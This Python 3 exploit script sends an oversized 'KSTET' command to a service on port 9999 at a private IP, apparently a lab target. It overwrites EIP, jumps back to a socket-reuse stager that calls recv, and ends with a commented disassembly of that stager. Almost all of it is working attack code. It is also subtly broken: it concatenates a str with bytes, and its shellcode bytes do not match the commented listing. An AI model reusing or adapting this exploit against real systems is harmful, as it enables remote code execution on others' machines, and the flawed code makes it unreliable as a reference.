#!/usr/bin/python3

import socket
import struct
import subprocess

target_ip = "192.168.255.140"
target_port = 9999

def make_string(offset):
    prepend = b"KSTET "
    #cmd = "/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l %d" %offset
    #check_string = subprocess.check_output(cmd, shell=True)
    eip = struct.pack("<I", 0x62501205)
    call_recv = b"\x54\x59\x66\x81\xE9\x7C\x02\x33\xD2\x52\x80\xC6\x02\x52\x54\x5A\x80\xC2\x08\x52\xFF\x31\xE8\x4E\x2B\x88\xFF"
    junk = b"\xcc" + call_recv + "\xcc"*(offset - 1 - len(call_recv)) + eip + b"\xeb\xb4" + b"C"*100
    crash_string = prepend + junk
    return crash_string

def exploit(crash_string):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target_ip, target_port))
    response = s.recv(2048)
    print(response.decode())
    s.send(crash_string)
    s.close()

def main():
    offset = 70
    crash_string = make_string(offset)
    exploit(crash_string)

if __name__ == "__main__": 
    main()

    
'''
54 59 66 81 E9 7C 02 83 EC 50 33 D2 52 80 C6 02 52 54 5A 80 C2 30 52 FF 31 E8 4B 2B 88 FF

00B7F9C3   54               PUSH ESP
00B7F9C4   59               POP ECX
00B7F9C5   66:81E9 7C02     SUB CX,27C
00B7F9CA   83EC 50          SUB ESP,50
00B7F9CD   33D2             XOR EDX,EDX
00B7F9CF   52               PUSH EDX
00B7F9D0   80C6 02          ADD DH,2
00B7F9D3   52               PUSH EDX
00B7F9D4   54               PUSH ESP
00B7F9D5   5A               POP EDX
00B7F9D6   80C2 30          ADD DL,30
00B7F9D9   52               PUSH EDX
00B7F9DA   FF31             PUSH DWORD PTR DS:[ECX]
00B7F9DC   E8 4B2B88FF      CALL <JMP.&WS2_32.recv>
